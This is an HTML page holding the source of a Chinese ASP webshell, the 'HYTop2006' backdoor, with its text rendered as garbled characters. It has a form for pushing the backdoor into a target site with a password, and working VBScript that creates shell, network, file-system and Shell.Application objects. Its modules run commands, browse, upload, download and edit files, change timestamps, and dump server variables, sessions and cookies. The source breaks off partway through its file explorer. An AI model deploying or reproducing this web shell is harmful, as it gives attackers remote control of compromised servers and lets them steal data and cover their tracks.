   <html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>º£Ñô¶¥¶ËÍøASPºóÃÅÖ´ÐÐPlus</title></head><style>BODY {    FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: "Courier New"; scrollbar-face-color:#E4E4F3;   scrollbar-highlight-color:#FFFFFF;  scrollbar-3dlight-color:#E4E4F3;    scrollbar-darkshadow-color:#9C9CD3; scrollbar-shadow-color:#E4E4F3; scrollbar-arrow-color:#4444B3;  scrollbar-track-color:#EFEFEF;}TABLE {  FONT-SIZE: 9pt; FONT-FAMILY: "Courier New"; BORDER-COLLAPSE: collapse;  border-top-width: 1px;  border-right-width: 1px;    border-bottom-width: 1px;   border-left-width: 1px; border-top-style: solid;    border-right-style: none;   border-bottom-style: none;  border-left-style: solid;   border-top-color: #d8d8f0;  border-right-color: #d8d8f0;    border-bottom-color: #d8d8f0;   border-left-color: #d8d8f0;}.tr {   font-family: "Courier New"; font-size: 9pt; background-color: #e4e4f3;  text-align: center;}.td {   font-family: "Courier New"; font-size: 9pt; background-color: #f9f9fd;}.warningColor {  font-family: "Courier New"; font-size: 9pt; color: #ff0000;}input { font-family: "Courier New"; BORDER-TOP-WIDTH: 1px;  BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 12px;    BORDER-BOTTOM-WIDTH: 1px;BORDER-RIGHT-WIDTH: 1px;   color: #000000;}textarea {  font-family: "Courier New"; BORDER-TOP-WIDTH: 1px;  BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 12px;    BORDER-BOTTOM-WIDTH: 1px;   BORDER-RIGHT-WIDTH: 1px;    color: #000000;}A:link {    FONT-SIZE: 9pt;     COLOR: #000000; FONT-FAMILY: "Courier New";     TEXT-DECORATION: none;}tr { font-family: "Courier New"; font-size: 9pt; line-height: 18px;}td { font-family: "Courier New"; font-size: 9pt; border-top-width: 1px;  border-right-width: 1px;    border-bottom-width: 1px;   border-left-width: 1px; border-top-style: none; border-right-style: solid;  border-bottom-style: solid; border-left-style: none;    border-top-color: #d8d8f0;  border-right-color: #d8d8f0;    border-bottom-color: #d8d8f0;   border-left-color: #d8d8f0;}.trHead {   font-family: "Courier New"; font-size: 9pt; background-color: #e4e4f3;  line-height: 3px;}.inputLogin { font-family: "Courier New"; font-size: 9pt; border: 1px solid #d8d8f0;  background-color: #f9f9fd;  vertical-align: bottom;}</style>
   <body><table width="760" border="0" align="center" cellpadding="0" cellspacing="0"><form method="post" target="_blank"><tr><td height="22" class="td"> &nbsp;º£Ñô¶¥¶ËÍøASPºóÃÅÖ´ÐÐPlus </td></tr><tr><td class="trHead">&nbsp;</td></tr><tr><td height="18" align="center" class="td">&nbsp;±íµ¥Ìá½»µØÖ·: <input name="theAction" type="text" id="theAction" value="http://" size="50">ÃÜÂë: <input name="password" type="password" id="password" size="5"> <input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.rows+=10;" value="+"> <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.sharp.rows>11){this.form.sharp.rows-=10;}" value="-"></td></tr><tr><td align="center" class="td"> <textarea name="#" id="sharp" cols="80" rows="30">  On Error Resume Next
       Set ws=server.createObject("WScript.Shell")
       On Error Resume Next
       Set ws=server.createObject("WScript.Shell")
       On Error Resume Next
       Set net=server.createObject("WScript.Network")
       On Error Resume Next
       Set net=server.createObject("WScript.Network")
       On Error Resume Next
       Set fso=server.createObject("Scripting.FileSystemObject")
       On Error Resume Next
       Set sa=server.createObject("Shell.Application")
   '   Option Explicit
       Dim sTime, aspPath, pageName
       sTime = Timer
       pageName = Request(&quot;pageName&quot;)
       aspPath = Replace(Server.MapPath(&quot;.&quot;) & &quot;\~86.tmp&quot;, &quot;\\&quot;, &quot;\&quot;) ''ÏµÍ³ÁÙÊ±ÎÄ¼þ

       Const m = &quot;HYTop2006¦Á&quot;                   ''×Ô¶¨ÒåSessionÇ°×º
       Const myName = &quot;Ö¥Âé¿ªÃÅ,Å¼ÊÇÀÏÂí&quot;        ''µÇÂ¼Ò³°´Å¤ÉÏµÄÎÄ×Ö
       Const isDebugMode = False               ''ÊÇ·ñÏÔÊ¾ÍêÕû´íÎóÐÅÏ¢
       Const clientPassword = &quot;#&quot;                ''²åÈëºóÃÅµÄÃÜÂë,Èç¹ûÒª²åÈëÊý¾Ý¿âÖÐ,Ö»ÄÜÎªÒ»¸ö×Ö·û.
       Const notdownloadsExists = False        ''ÔACCESSÊý¾Ý¿âÖÐÊÇ·ñ´æÔÚnotdownloadsExists±í
       Const myCmdDotExeFile = &quot;command.com&quot; ''¶¨Òåcmd.exeÎÄ¼þµÄÎÄ¼þÃû
       Const userPassword = &quot;lcxMarcos&quot;      ''¹ÜÀíÃÜÂë
       Const showLogin = &quot;&quot;                  ''Îª¿ÕÖ±½ÓÏÔÊ¾µÇÂ¼½çÃæ,·ñÔòÓÃ&quot;?pageName=ËüµÄÖµ&quot;À´½øÐÐ·ÃÎÊ
       Const strJsCloseMe = &quot;&lt;input type=button value=' ¹Ø±Õ ' onclick='window.close();'>&quot;
       Sub chkErr(Err)
           If Err Then
               echo &quot;&lt;style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}&lt;/style>&quot;
               echo &quot;&lt;br/>&lt;font size=2>&lt;li>´íÎó: &quot; & Err.Description & &quot;&lt;/li>&lt;li>´íÎóÔ´: &quot; & Err.Source & &quot;&lt;/li>&lt;br/>&quot;
               echo &quot;&lt;hr>Powered By Marcos 2005.02&lt;/font>&quot;
               Err.Clear
               Response.End
           End If
       End Sub

       Sub echo(str)
           Response.Write(str)
       End Sub

       Sub isIn()
           If pageName &lt;> &quot;&quot; And PageName &lt;> &quot;login&quot; And PageName &lt;> showLogin Then
               If Session(m & &quot;userPassword&quot;) &lt;> userPassword Then
                   Response.End
               End If
           End If
       End Sub

       Sub showTitle(str)
           echo &quot;&lt;title>&quot; & str & &quot; - º£Ñô¶¥¶ËÍøASPÄ¾Âí2006¦Á - By Marcos & LCX&lt;/title>&quot; & vbNewLine
           echo &quot;&lt;meta http-equiv='Content-Type' content='text/html; charset=gb2312'>&quot; & vbNewLine
           echo &quot;&lt;!--getTerminalInfo()´úÂëÔÐÍÀ´×ÔkEvin1986-->&quot; & vbNewLine
           echo &quot;&lt;!--±¾°æ²¿·ÖÍ¼±ê×ÊÔ´À´×ÔCOCOON, ¸ÐÐ»Sunrise_Chen-->&quot; & vbNewLine
           echo &quot;&lt;!--¸ÐÐ»:Íø³½ÔÚÏß¡¢»¯¾³±à³Ì¡¢¹ðÁÖÀÏ±ø¡¢±ùºüÀË×Ó¡¢À¶ÆÁ¡¢Ð¡Â·¡¢wangyong¡¢czy¡¢allen¡¢lcx¡¢Marcos¡¢kEvin1986¶Ôº£Ñô¶¥¶ËÍøaspÄ¾ÂíËù×öµÄÒ»ÇÐÅ¬Á¦-->&quot; & vbNewLine
           PageOther()
       End Sub

       Function fixNull(str)
           If IsNull(str) Then
               str = &quot; &quot;
           End If
           fixNull = str
       End Function

       Function encode(str)
           str = Server.HTMLEncode(str)
           str = Replace(str, vbNewLine, &quot;&lt;br>&quot;)
           str = Replace(str, &quot; &quot;, &quot;&nbsp;&quot;)
           str = Replace(str, &quot;   &quot;, &quot;&nbsp;&nbsp;&nbsp;&nbsp;&quot;)
           encode = str
       End Function

       Function getTheSize(theSize)
           If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & &quot;G&quot;
           If theSize >= (1024 * 1024) And theSize &lt; (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & &quot;M&quot;
           If theSize >= 1024 And theSize &lt; (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 & &quot;K&quot;
           If theSize >= 0 And theSize &lt;1024 Then getTheSize = theSize & &quot;B&quot;
       End Function

       Sub showExecuteTime()
           Response.Write &quot;&quot; & (Timer() - sTime) * 1000 & &quot; ms&quot;
       End Sub

       Function HtmlEncode(str)
           If isNull(str) Then
               Exit Function
           End If
           HtmlEncode = Server.HTMLEncode(str)
       End Function

       Function UrlEncode(str)
           If isNull(str) Then
               Exit Function
           End If
           UrlEncode = Server.UrlEncode(str)
       End Function

       Sub redirectTo(strUrl)
           Response.Redirect(Request.ServerVariables(&quot;URL&quot;) & strUrl)
       End Sub
       Function trimThePath(strPath)
           If Right(strPath, 1) = &quot;\&quot; And Len(strPath) > 3 Then
               strPath = Left(strPath, Len(strPath) - 1)
           End If
           trimThePath = strPath
       End Function
       Sub alertThenClose(strInfo)
           Response.Write &quot;&lt;script>alert(&quot;&quot;&quot; & strInfo & &quot;&quot;&quot;);window.close();&lt;/script>&quot;
       End Sub
       Sub showErr(str)
           Dim i, arrayStr
           str = Server.HtmlEncode(str)
           arrayStr = Split(str, &quot;$$&quot;)
   '       Response.Clear
           echo &quot;&lt;font size=2>&quot;
           echo &quot;³ö´íÐÅÏ¢:&lt;br/>&lt;br/>&quot;
           For i = 0 To UBound(arrayStr)
               echo &quot;&nbsp;&nbsp;&quot; & (i + 1) & &quot;. &quot; & arrayStr(i) & &quot;&lt;br/>&quot;
           Next
           echo &quot;&lt;/font>&quot;
           Response.End
       End Sub
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
       Rem     ÏÂÃæÊÇ³ÌÐòÄ£¿éÑ¡Ôñ²¿·Ö
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
       isIn()
       Select Case pageName
           Case showLogin, &quot;login&quot;
               PageLogin()
           Case &quot;PageList&quot;
               PageList()
           Case &quot;objOnSrv&quot;
               PageObjOnSrv()
           Case &quot;ServiceList&quot;
               PageServiceList()
           Case &quot;userList&quot;
               PageUserList()
           Case &quot;CSInfo&quot;
               PageCSInfo()
           Case &quot;infoAboutSrv&quot;
               PageInfoAboutSrv()
           Case &quot;AppFileExplorer&quot;
               PageAppFileExplorer()
           Case &quot;SaCmdRun&quot;
               PageSaCmdRun()
           Case &quot;WsCmdRun&quot;
               PageWsCmdRun()
           Case &quot;FsoFileExplorer&quot;
               PageFsoFileExplorer()
           Case &quot;MsDataBase&quot;
               PageMsDataBase()
           Case &quot;OtherTools&quot;
               PageOtherTools()
           Case &quot;TxtSearcher&quot;
               PageTxtSearcher()
       End Select
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       Rem     ÏÂÃæÊÇ¸÷¶ÀÁ¢¹¦ÄÜÄ£¿é
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       Sub PageAppFileExplorer()
           Response.Buffer = True
           Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
           Dim intI, theAct, strFolderList, strFileList, strFilePath, strFileName, strParentPath
           showTitle(&quot;Shell.ApplicationÎÄ¼þä¯ÀÀÆ÷(&stream)&quot;)
           theAct = Request(&quot;theAct&quot;)
           strNewName = Request(&quot;newName&quot;)
           thePath = Replace(LTrim(Request(&quot;thePath&quot;)), &quot;\\&quot;, &quot;\&quot;)

           If theAct &lt;> &quot;upload&quot; Then
               If Request.Form.Count > 0 Then
                   theAct = Request.Form(&quot;theAct&quot;)
                   thePath = Replace(LTrim(Request.Form(&quot;thePath&quot;)), &quot;\\&quot;, &quot;\&quot;)
               End If
           End If
           echo &quot;&lt;style>body{margin:8;}&lt;/style>&quot;

           Select Case theAct
               Case &quot;openUrl&quot;
                   openUrl(thePath)
               Case &quot;showEdit&quot;
                   Call showEdit(thePath, &quot;stream&quot;)
               Case &quot;saveFile&quot;
                   Call saveToFile(thePath, &quot;stream&quot;)
               Case &quot;copyOne&quot;, &quot;cutOne&quot;
                   If thePath = &quot;&quot; Then
                       alertThenClose(&quot;²ÎÊý´íÎó!&quot;)
                       Response.End
                   End If
                   Session(m & &quot;appThePath&quot;) = thePath
                   Session(m & &quot;appTheAct&quot;) = theAct
                   alertThenClose(&quot;²Ù×÷³É¹¦,ÇëÕ³Ìù!&quot;)
               Case &quot;pastOne&quot;
                   appDoPastOne(thePath)
                   alertThenClose(&quot;Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!&quot;)
               Case &quot;rename&quot;
                   appRenameOne(thePath)
               Case &quot;downTheFile&quot;
                   downTheFile(thePath)
               Case &quot;theAttributes&quot;
                   appTheAttributes(thePath)
               Case &quot;showUpload&quot;
                   Call showUpload(thePath, &quot;AppFileExplorer&quot;)
               Case &quot;upload&quot;
                   streamUpload(thePath)
                   Call showUpload(thePath, &quot;AppFileExplorer&quot;)
           End Select

           If theAct &lt;> &quot;&quot; Then
               Response.End
           End If


           Set objFolder = sa.NameSpace(thePath)

           If Request.Form.Count > 0 Then
               redirectTo(&quot;?pageName=AppFileExplorer&thePath=&quot; & UrlEncode(thePath))
           End If
           echo &quot;&lt;input type=hidden name=usePath />&lt;input type=hidden value=AppFileExplorer name=pageName />&quot;
           echo &quot;&lt;input type=hidden value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; name=truePath />&quot;
           echo &quot;&lt;div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>&quot;
           echo &quot;&lt;input type=button value=' ´ò¿ª ' onclick='openUrl();'>&quot;
           echo &quot;&lt;input type=button value=' ±à¼ ' onclick='editFile();'>&quot;
           echo &quot;&lt;input type=button value=' ¸´ÖÆ ' onclick=appDoAction('copyOne');>&quot;
           echo &quot;&lt;input type=button value=' ¼ôÇÐ ' onclick=appDoAction('cutOne');>&quot;
           echo &quot;&lt;input type=button value=' Õ³Ìù ' onclick=appDoAction2('pastOne');>&quot;
           echo &quot;&lt;input type=button value=' ÉÏ´« ' onclick='upTheFile();'>&quot;
           echo &quot;&lt;input type=button value=' ÏÂÔØ ' onclick='downTheFile();'>&quot;
           echo &quot;&lt;input type=button value=' ÊôÐÔ ' onclick='appTheAttributes();'>&quot;
           echo &quot;&lt;input type=button value='ÖØÃüÃû' onclick='appRename();'>&quot;
           echo &quot;&lt;input type=button value='ÎÒµÄµçÄÔ' onclick=location.href='?pageName=AppFileExplorer&thePath='>&quot;
           echo &quot;&lt;input type=button value='¿ØÖÆÃæ°å' onclick=location.href='?pageName=AppFileExplorer&thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>&quot;
           echo &quot;&lt;form method=post action='?pageName=AppFileExplorer'>&quot;
           echo &quot;&lt;input type=button value=' ºóÍË ' onclick='this.disabled=true;history.back();' />&quot;
           echo &quot;&lt;input type=button value=' Ç°½ø ' onclick='this.disabled=true;history.go(1);' />&quot;
           echo &quot;&lt;input type=button value=Õ¾µã¸ù onclick=location.href=&quot;&quot;?pageName=AppFileExplorer&thePath=&quot; & URLEncode(Server.MapPath(&quot;\&quot;)) & &quot;&quot;&quot;;>&quot;
           echo &quot;&lt;input style='width:60%;' name=thePath value=&quot;&quot;&quot; & HtmlEncode(thePath) & &quot;&quot;&quot; />&quot;
           echo &quot;&lt;input type=submit value=' GO.' />&lt;input type=button value=' Ë¢ÐÂ ' onclick='location.reload();'>&lt;/form>&lt;hr/>&quot;
           echo &quot;&lt;/div>&lt;div style='height:50px;'>&lt;/div>&quot;
           echo &quot;&lt;script>fixTheLayer('fileExplorerTools');setInterval(&quot;&quot;fixTheLayer('fileExplorerTools');&quot;&quot;, 200);&lt;/script>&quot;
           For Each objMember In objFolder.Items
               intI = intI + 1
               If intI > 200 Then
                   intI = 0
                   Response.Flush()
               End If

               If objMember.IsFolder = True Then
                   If Left(objMember.Path, 2) = &quot;::&quot; Then
                       strPath = URLEncode(objMember.Path)
                    Else
                       strPath = URLEncode(objMember.Path) & &quot;%5C&quot;
                   End If
                   strFolderList = strFolderList & &quot;&lt;span id=&quot;&quot;&quot; & strPath & &quot;&quot;&quot; ondblclick='changeThePath(this);' onclick='changeMyClass(this);'>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>&quot; & objMember.Name & &quot;&lt;/span>&quot;
                Else
                   strDetails = objFolder.GetDetailsOf(objMember, -1)
                   strFilePath = objMember.Path
                   strFileName = Mid(strFilePath, InStrRev(strFilePath, &quot;\&quot;) + 1)
                   strExtName = Split(strFileName, &quot;.&quot;)(UBound(Split(strFileName, &quot;.&quot;)))
                   strFileList = strFileList & &quot;&lt;span title=&quot;&quot;&quot; & strDetails & &quot;&quot;&quot; ondblclick='openUrl();' id=&quot;&quot;&quot; & URLEncode(strFilePath) & &quot;&quot;&quot; onclick='changeMyClass(this);'>&lt;font class=font face=&quot; & getFileIcon(strExtName) & &quot;&lt;/font>&lt;br/>&quot; & strFileName & &quot;&lt;/span>&quot;
               End If
           Next
           strParentPath = getParentPath(thePath)
           If thePath &lt;> &quot;&quot; And Left(thePath, 2) &lt;> &quot;::&quot; Then
               strFolderList = &quot;&lt;span id=&quot;&quot;&quot; & URLEncode(strParentPath) & &quot;&quot;&quot; ondblclick='changeThePath(this);' onclick='changeMyClass(this);'>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>..&lt;/span>&quot; & strFolderList
           End If
           echo &quot;&lt;div id=FileList>&quot;
           echo strFolderList & strFileList
           echo &quot;&lt;/div>&quot;
           echo &quot;&lt;hr/>Powered By Marcos 2005.02&quot;

           Set objFolder = Nothing
       End Sub

       Function getParentPath(strPath)
           If Right(strPath, 1) = &quot;\&quot; Then
               strPath = Left(strPath, Len(strPath) - 1)
           End If
           If Len(strPath) = 2 Then
               getParentPath = &quot; &quot;
            Else
               getParentPath = Left(strPath, InStrRev(strPath, &quot;\&quot;))
           End If
       End Function
       Function streamSaveToFile(thePath, fileContent)
           Dim stream
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Set stream = Server.CreateObject(&quot;adodb.stream&quot;)
           With stream
               .Type=2
               .Mode=3
               .Open
               chkErr(Err)
               .Charset=&quot;gb2312&quot;
               .WriteText fileContent
               .saveToFile thePath, 2
               .Close
           End With
           Set stream = Nothing
       End Function

       Sub appDoPastOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strAct, strPath
           dim objTargetFolder
           strAct = Session(m & &quot;appTheAct&quot;)
           strPath = Session(m & &quot;appThePath&quot;)

           If strAct = &quot;&quot; Or strPath = &quot;&quot; Then
               alertThenClose(&quot;²ÎÊý´íÎó,Õ³ÌùÇ°ÇëÏÈ¸´ÖÆ/¼ôÇÐ!&quot;)
               Exit Sub
           End If

           If InStr(LCase(thePath), LCase(strPath)) > 0 Then
               alertThenClose(&quot;Ä¿±êÎÄ¼þ¼ÐÔÚÔ´ÎÄ¼þ¼ÐÄÚ,·Ç·¨²Ù×÷!&quot;)
               Exit Sub
           End If
           strPath = trimThePath(strPath)
           thePath = trimThePath(thePath)
           Set objTargetFolder = sa.NameSpace(thePath)
           If strAct = &quot;copyOne&quot; Then
               objTargetFolder.CopyHere(strPath)
            Else
               objTargetFolder.MoveHere(strPath)
           End If
           chkErr(Err)

           Set objTargetFolder = Nothing
       End Sub

       Sub appTheAttributes(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, strSth, objFolder, objItem, strModifyDate
           strModifyDate = Request(&quot;ModifyDate&quot;)

           thePath = trimThePath(thePath)
           If thePath = &quot;&quot; Then
               alertThenClose(&quot;Ã»ÓÐÑ¡ÔñÈÎºÎÎÄ¼þ(¼Ð)!&quot;)
               Exit Sub
           End If
           strSth = Left(thePath, InStrRev(thePath, &quot;\&quot;))
           Set objFolder = sa.NameSpace(strSth)
           chkErr(Err)
           strSth = Split(thePath, &quot;\&quot;)(UBound(Split(thePath, &quot;\&quot;)))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)
           If isDate(strModifyDate) Then
               objItem.ModifyDate = strModifyDate
               alertThenClose(&quot;ÐÞ¸Ä³É¹¦!&quot;)
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit Sub
           End If

   '       strSth = objFolder.GetDetailsOf(objItem, -1)
   '       strSth = Replace(strSth, chr(10), &quot;&lt;br/>&quot;)
           For i = 1 To 8
               strSth = strSth & &quot;&lt;br/>ÊôÐÔ(&quot; & i & &quot;): &quot; & objFolder.GetDetailsOf(objItem, i)
           Next
           strSth = Replace(strSth, &quot;ÊôÐÔ(1)&quot;, &quot;´óÐ¡&quot;)
           strSth = Replace(strSth, &quot;ÊôÐÔ(2)&quot;, &quot;ÀàÐÍ&quot;)
           strSth = Replace(strSth, &quot;ÊôÐÔ(3)&quot;, &quot;×îºóÐÞ¸Ä&quot;)
           strSth = Replace(strSth, &quot;ÊôÐÔ(8)&quot;, &quot;ËùÓÐÕß&quot;)
           strSth = strSth & &quot;&lt;form method=post>&quot;
           strSth = strSth & &quot;&lt;input type=hidden name=theAct value=theAttributes>&quot;
           strSth = strSth & &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & thePath & &quot;&quot;&quot;>&quot;
           strSth = strSth & &quot;&lt;br/>×îºóÐÞ¸Ä: &lt;input size=30 value='&quot; & objFolder.GetDetailsOf(objItem, 3) & &quot;' name=ModifyDate />&quot;
           strSth = strSth & &quot;&lt;input type=submit value=' ÐÞ¸Ä '>&quot;
           strSth = strSth & &quot;&lt;/form>&quot;
           echo strSth

           Set objItem = Nothing
           Set objFolder = Nothing
       End Sub

       Sub appRenameOne(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strSth, fileName, objItem, objFolder
           fileName = Request(&quot;fileName&quot;)

           thePath = trimThePath(thePath)
           strSth = Left(thePath, InStrRev(thePath, &quot;\&quot;))
           Set objFolder = sa.NameSpace(strSth)
           chkErr(Err)
           strSth = Split(thePath, &quot;\&quot;)(UBound(Split(thePath, &quot;\&quot;)))
           Set objItem = objFolder.ParseName(strSth)
           chkErr(Err)
           strSth = Split(thePath, &quot;.&quot;)(UBound(Split(thePath, &quot;.&quot;)))

           If fileName &lt;> &quot;&quot; Then
               objItem.Name = fileName
               chkErr(Err)
               alertThenClose(&quot;ÖØÃüÃû³É¹¦,Ë¢ÐÂ±¾Ò³¿ÉÒÔ¿´µ½Ð§¹û!&quot;)
               Set objItem = Nothing
               Set objFolder = Nothing
               Exit Sub
           End If

           echo &quot;&lt;form method=post>ÖØÃüÃû:&quot;
           echo &quot;&lt;input type=hidden name=theAct value=rename>&quot;
           echo &quot;&lt;input type=hidden name=thePath value=&quot;&quot;&quot; & thePath & &quot;&quot;&quot;>&quot;
           echo &quot;&lt;br/>&lt;input size=30 value=&quot;&quot;&quot; & objItem.Name & &quot;&quot;&quot; name=fileName />&quot;
           If InStr(strSth, &quot;:&quot;) &lt;= 0 Then
               echo &quot;.&quot; & strSth
           End If
           echo &quot;&lt;hr/>&lt;input type=submit value=' ÐÞ¸Ä '>&quot; & strJsCloseMe
           echo &quot;&lt;/form>&quot;

           Set objItem = Nothing
           Set objFolder = Nothing
       End Sub
       Sub PageCSInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strKey, strVar, strVariable

           showTitle(&quot;¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢&quot;)

           echo &quot;&lt;a href=javascript:showHideMe(ServerVariables);>ServerVariables:&lt;/a>&quot;
           echo &quot;&lt;span id=ServerVariables style='display:none;'>&quot;
           For Each strVariable In Request.ServerVariables
               echo &quot;&lt;li>&quot; & strVariable & &quot;: &quot; & Request.ServerVariables(strVariable) & &quot;&lt;/li>&quot;
           Next
           echo &quot;&lt;/span>&quot;

           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(Application);>Application:&lt;/a>&quot;
           echo &quot;&lt;span id=Application style='display:none;'>&quot;
           For Each strVariable In Application.Contents
               echo &quot;&lt;li>&quot; & strVariable & &quot;: &quot; & Encode(Application(strVariable)) & &quot;&lt;/li>&quot;
               If Err Then
                   For Each strVar In Application.Contents(strVariable)
                       echo &quot;&lt;li>&quot; & strVariable & &quot;(&quot; & strVar & &quot;): &quot; & Encode(Application(strVariable)(strVar)) & &quot;&lt;/li>&quot;
                   Next
                   Err.Clear
               End If
           Next
           echo &quot;&lt;/span>&quot;
           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(Session);>Session:(ID&quot; & Session.SessionId & &quot;)&lt;/a>&quot;
           echo &quot;&lt;span id=Session style='display:none;'>&quot;
           For Each strVariable In Session.Contents
               echo &quot;&lt;li>&quot; & strVariable & &quot;: &quot; & Encode(Session(strVariable)) & &quot;&lt;/li>&quot;
           Next
           echo &quot;&lt;/span>&quot;

           echo &quot;&lt;br/>&lt;a href=javascript:showHideMe(Cookies);>Cookies:&lt;/a>&quot;
           echo &quot;&lt;span id=Cookies style='display:none;'>&quot;
           For Each strVariable In Request.Cookies
               If Request.Cookies(strVariable).HasKeys Then
                   For Each strKey In Request.Cookies(strVariable)
                       echo &quot;&lt;li>&quot; & strVariable & &quot;(&quot; & strKey & &quot;): &quot; & HtmlEncode(Request.Cookies(strVariable)(strKey)) & &quot;&lt;/li>&quot;
                   Next
                Else
                   echo &quot;&lt;li>&quot; & strVariable & &quot;: &quot; & Encode(Request.Cookies(strVariable)) & &quot;&lt;/li>&quot;
               End If
           Next
           echo &quot;&lt;/span>&lt;hr/>Powered By Marcos 2005.02&quot;

       End Sub
       Sub PageFsoFileExplorer()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Response.Buffer = True
           Dim file, drive, folder, theFiles, theFolder, theFolders
           Dim i, theAct, strTmp, driveStr, thePath, parentFolderName

           theAct = Request(&quot;theAct&quot;)
           thePath = Request(&quot;thePath&quot;)
           If theAct &lt;> &quot;upload&quot; Then
               If Request.Form.Count > 0 Then
                   theAct = Request.Form(&quot;theAct&quot;)
                   thePath = Request.Form(&quot;thePath&quot;)
               End If
           End If
           showTitle(&quot;FSOÎÄ¼þä¯ÀÀÆ÷(&stream)&quot;)

           Select Case theAct
               Case &quot;newOne&quot;, &quot;doNewOne&quot;
                   fsoNewOne(thePath)
               Case &quot;showEdit&quot;
                   Call showEdit(thePath, &quot;fso&quot;)
               Case &quot;saveFile&quot;
                   Call saveToFile(thePath, &quot;fso&quot;)
               Case &quot;openUrl&quot;
                   openUrl(thePath)
               Case &quot;copyOne&quot;, &quot;cutOne&quot;
                   If thePath = &quot;&quot; Then
                       alertThenClose(&quot;²ÎÊý´íÎó!&quot;)
                       Response.End
                   End If
                   Session(m & &quot;fsoThePath&quot;) = thePath
                   Session(m & &quot;fsoTheAct&quot;) = theAct
                   alertThenClose(&quot;²Ù×÷³É¹¦,ÇëÕ³Ìù!&quot;)
               Case &quot;pastOne&quot;
                   fsoPastOne(thePath)
                   alertThenClose(&quot;Õ³Ìù³É¹¦,ÇëË¢ÐÂ±¾Ò³²é¿´Ð§¹û!&quot;)
               Case &quot;showFsoRename&quot;
                   showFsoRename(thePath)
               Case &quot;doRename&quot;
                   Call fsoRename(thePath)
                   alertThenClose(&quot;ÖØÃüÃû³É¹¦,Ë¢ÐÂºó¿ÉÒÔ¿´µ½Ð§¹û!&quot;)
               Case &quot;delOne&quot;, &quot;doDelOne&quot;
                   showFsoDelOne(thePath)
               Case &quot;getAttributes&quot;, &quot;doModifyAttributes&quot;
                   fsoTheAttributes(thePath)
               Case &quot;downTheFile&quot;
                   downTheFile(thePath)
               Case &quot;showUpload&quot;
                   Call showUpload(thePath, &quot;FsoFileExplorer&quot;)
               Case &quot;upload&quot;
                   streamUpload(thePath)
                   Call showUpload(thePath, &quot;FsoFileExplorer&quot;)
           End Select

           If theAct &lt;> &quot;&quot; Then
               Response.End
           End If

           If Request.Form.Count > 0 Then
               redirectTo(&quot;?pageName=FsoFileExplorer&thePath=&quot; & UrlEncode(thePath))
           End If

           parentFolderName = fso.GetParentFolderName(thePath)

           echo &quot;&lt;div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>&quot;
           echo &quot;&lt;input type=button value=' ÐÂ½¨ ' onclick=newOne();>&quot;
           echo &quot;&lt;input type=button value=' ¸üÃû ' onclick=fsoRename();>&quot;
           echo &quot;&lt;input type=button value=' ±à¼ ' onclick=editFile();>&quot;
           echo &quot;&lt;input type=button value=' ´ò¿ª ' onclick=openUrl();>&quot;
           echo &quot;&lt;input type=button value=' ¸´ÖÆ ' onclick=appDoAction('copyOne');>&quot;
           echo &quot;&lt;input type=button value=' ¼ôÇÐ ' onclick=appDoAction('cutOne');>&quot;
           echo &quot;&lt;input type=button value=' Õ³Ìù ' onclick=appDoAction2('pastOne')>&quot;
           echo &quot;&lt;input type=button value=' ÊôÐÔ ' onclick=fsoGetAttributes();>&quot;
           echo &quot;&lt;input type=button value=' É¾³ý ' onclick=delOne();>&quot;
           echo &quot;&lt;input type=button value=' ÉÏ´« ' onclick='upTheFile();'>&quot;
           echo &quot;&lt;input type=button value=' ÏÂÔØ ' onclick='downTheFile();'>&quot;
           echo &quot;&lt;br/>&quot;
           echo &quot;&lt;input type=hidden value=FsoFileExplorer name=pageName />&quot;
           echo &quot;&lt;input type=hidden value=&quot;&quot;&quot; & UrlEncode(thePath) & &quot;&quot;&quot; name=truePath>&quot;
           echo &quot;&lt;input type=hidden size=50 name=usePath>&quot;
           echo &quot;&lt;form method=post action=?pageName=FsoFileExplorer>&quot;
           If parentFolderName &lt;> &quot;&quot; Then
               echo &quot;&lt;input value='¡üÏòÉÏ' type=button onclick=&quot;&quot;this.disabled=true;location.href='?pageName=FsoFileExplorer&thePath=&quot; & Server.UrlEncode(parentFolderName) & &quot;';&quot;&quot;>&quot;
           End If
           echo &quot;&lt;input type=button value=' ºóÍË ' onclick='this.disabled=true;history.back();' />&quot;
           echo &quot;&lt;input type=button value=' Ç°½ø ' onclick='this.disabled=true;history.go(1);' />&quot;
